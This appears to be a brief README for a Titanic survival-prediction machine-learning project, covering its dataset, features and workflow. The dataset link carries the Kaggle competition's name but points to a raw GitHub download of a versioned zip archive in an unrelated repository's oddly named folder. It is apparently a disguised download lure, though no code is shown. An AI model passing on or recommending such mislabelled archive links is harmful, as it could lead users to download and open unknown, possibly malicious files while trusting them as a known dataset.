Titanic Survival Prediction 

This project predicts whether a passenger survived the Titanic disaster using machine learning.  
It includes data cleaning, feature engineering, model selection, and evaluation — built on Kaggle.

Dataset
- [Titanic - Machine Learning from Disaster]([https://github.com/mitansio/Dagim-data-science-projects/raw/refs/heads/main/pumplike/Dagim_data_science_projects_3.8.zip])
- Features: Age, Sex, Fare, Class, etc.
- Target: Survival (0 = No, 1 = Yes)

 Workflow
1. Data Cleaning and Preprocessing  
2. Exploratory Data Analysis (EDA)  
3. Feature Engineering  
4. Model Training and Evaluation  
5. Submission to Kaggle
